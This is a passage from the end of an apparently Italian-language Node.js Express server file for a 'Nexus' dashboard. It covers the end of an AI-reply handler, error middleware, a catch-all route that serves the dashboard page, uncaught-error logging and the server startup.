    const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || 'Nessuna risposta';
    res.json({ reply });
  } catch (e) {
    res.json({ reply: `Errore AI: ${e.message}` });
  }
});

// ── Fallback → dashboard ──────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[request]', err.message);
  if (res.headersSent) return next(err);
  res.status(err.message && err.message.startsWith('invalid ') ? 400 : 500)
    .json({ ok: false, error: err.message || 'internal error' });
});

app.get('/{*path}', (req, res) => {
  const index = path.join(DASHBOARD_DIR, 'index.html');
  if (fs.existsSync(index)) return res.sendFile(index);
  res.send('Nexus Server Online');
});

// ── Uncaught errors ───────────────────────────────────────────
process.on('uncaughtException', e => console.error('[uncaughtException]', e.message));
process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Nexus server running on port ${PORT}`));
